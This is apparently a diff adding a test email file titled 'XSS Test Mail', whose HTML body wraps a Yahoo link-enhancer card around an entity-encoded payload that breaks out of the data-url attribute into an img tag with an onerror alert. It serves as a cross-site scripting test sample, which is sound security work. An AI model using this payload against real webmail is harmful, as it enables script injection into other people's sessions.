@@ -1,0 +1,10 @@
+From: ben.sturgeon@gfinet.co.uk
+To: ricki.winters@enron.com, dana.jones@enron.com, sheila.nacey@enron.com, 
+Subject: XSS Test Mail
+MIME-Version: 1.0
+Content-type: text/html
+
+<div class="yahoo-link-enhancr-card" data-url="https://www.youtube.com/aaa&quot;&gt;&lt;img src=x onerror=alert(/xss/)&gt;&lt;">
+<div class="card-share-container">
+<a class="enhancr-play-btn"></a>
+</div></div>
